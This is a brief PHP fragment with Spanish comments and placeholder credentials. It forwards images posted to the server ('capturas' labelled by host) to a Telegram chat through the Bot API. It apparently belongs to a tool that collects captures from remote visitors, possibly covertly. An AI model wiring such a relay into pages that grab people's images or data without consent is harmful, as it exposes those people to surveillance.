<?php
// Tus credenciales de Telegram
$botToken = "TU_API_TOKEN_AQUI";
$chatId = "TU_CHAT_ID_AQUI";

function sendToTelegram($msg, $photo = null) {
    global $botToken, $chatId;
    
    if ($photo) {
        $url = "https://api.telegram.org/bot$botToken/sendPhoto";
        $post_fields = ['chat_id' => $chatId, 'photo' => new CURLFile(realpath($photo)), 'caption' => $msg];
    } else {
        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $post_fields = ['chat_id' => $chatId, 'text' => $msg];
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Al recibir la imagen, disparar la alerta
if ($_POST['img']) {
    // ... (tu código anterior de guardado) ...
    sendToTelegram("📸 ¡Nueva captura de: $host!", $filename);
}
?>
